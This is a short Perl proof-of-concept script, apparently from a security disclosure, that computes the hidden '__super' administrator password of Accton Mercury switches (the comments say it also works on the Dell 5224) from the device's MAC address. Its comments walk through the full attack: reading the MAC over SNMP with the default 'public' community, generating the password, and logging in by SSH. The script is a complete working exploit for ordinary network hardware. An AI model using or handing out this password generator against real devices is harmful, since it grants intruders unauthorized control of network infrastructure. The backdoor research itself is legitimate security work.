#!/usr/bin/perl -w
use strict;

# Accton Mercury "__super" user proof of concept
# Disassembling and first PoC - smite@zylon.net.
# Disassembling and math - psy@datux.nl, gido@datux.nl

#$ snmpget -v1 -c public 192.168.104.99 IF-MIB::ifPhysAddress.1001
#IF-MIB::ifPhysAddress.1001 = STRING: 0:d:54:9d:1b:90
#$ perl accton.pl 0:d:54:9d:1b:90
#!F!RELUO
#$ ssh __super@192.168.104.99
#__super@192.168.104.99's password: !F!RELUO

# JBP -- YES, this works on the Dell 5224!!


my $counter;
my $char;

my $mac = $ARGV[0];
my @mac;

foreach my $octet (split (":", $mac)) {
  push @mac, hex($octet);
}

if (!defined $mac[5]) {
    print "Usage: ./accton.pl 00:01:02:03:04:05\n";
    exit 1;
}

sub printchar {
	my ($char) = @_;

	$char = $char % 0x4b;
	
	if ($char <= 9 || ($char > 0x10 && $char < 0x2a) || $char > 0x30) {
	    print pack("c*", $char+0x30);
	} else {
	    print "!";
	}
}


for ($counter=0;$counter<5;$counter++) {
    $char = $mac[$counter];
    $char = $char + $mac[$counter+1];
    printchar($char);
}

for ($counter=0;$counter<3;$counter++) {
    $char = $mac[$counter];
    $char = $char + $mac[$counter+1];
    $char = $char +  0xF;
    printchar($char);
}

print "\n";

